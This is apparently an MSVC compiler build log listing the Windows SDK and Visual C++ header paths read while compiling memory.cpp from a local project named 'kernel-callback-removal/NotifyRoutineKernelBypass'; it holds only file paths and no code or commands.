C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINAPIFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINPACKAGEFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDKDDKVER.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EXCPT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\SAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CONCURRENCYSAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VADEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDARG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\MINWINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_STRICT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_UNDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDV_DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KERNELSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BASETSD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\GUIDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMCPY_S.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\ERRNO.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK4.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\POPPACK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK8.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK1.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KTMTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISETCCONV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MINWINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\APIQUERY2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSENV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPIFROMAPP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DEBUGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UTILAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HANDLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ERRHANDLINGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FIBERSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMEDPIPEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROFILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HEAPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IOAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYNCHAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\INTERLOCKEDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTHREADSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSINFOAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MEMORYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ENCLAVEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLLEGACYAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WOW64APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LIBLOADERAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMESPACEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSTEMTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYAPPCONTAINER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REALTIMEAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINERROR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEZONEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINGDI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINUSER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\TVOUT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNLS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DATETIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\STRINGAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCONTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI3.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\VERRSRC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINREG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REASON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNETWK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WNNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\CDERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDEML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DLGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LZEXPAND.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSTEM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSCOM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCIAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PLAYSOUNDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOYSTICKAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NB30.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCEP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNTERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCASYNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SHELLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINPERF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSOCK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\INADDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSCARD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSIP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCSAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPESBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINIOCTL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINSMCRD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSPOOL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PRSHT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLE2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDLIB.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MALLOC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SEARCH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDLIB.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\LIMITS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWNBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CGUID.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COML2API.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OAIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\URLMON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SERVPROV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MSXML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEAUTO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMMDLG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\STRALIGN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSVC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCX.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IMM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IME_CMODES.H
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMORY.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINDOWS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINAPIFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINPACKAGEFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDKDDKVER.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EXCPT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\SAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CONCURRENCYSAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VADEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDARG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\MINWINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_STRICT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_UNDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDV_DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KERNELSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BASETSD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\GUIDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMCPY_S.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\ERRNO.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK4.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\POPPACK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK8.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK1.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KTMTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISETCCONV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MINWINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\APIQUERY2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSENV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPIFROMAPP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DEBUGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UTILAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HANDLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ERRHANDLINGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FIBERSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMEDPIPEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROFILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HEAPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IOAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYNCHAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\INTERLOCKEDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTHREADSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSINFOAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MEMORYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ENCLAVEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLLEGACYAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WOW64APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LIBLOADERAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMESPACEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSTEMTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYAPPCONTAINER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REALTIMEAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINERROR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEZONEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINGDI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINUSER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\TVOUT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNLS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DATETIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\STRINGAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCONTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI3.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\VERRSRC.H
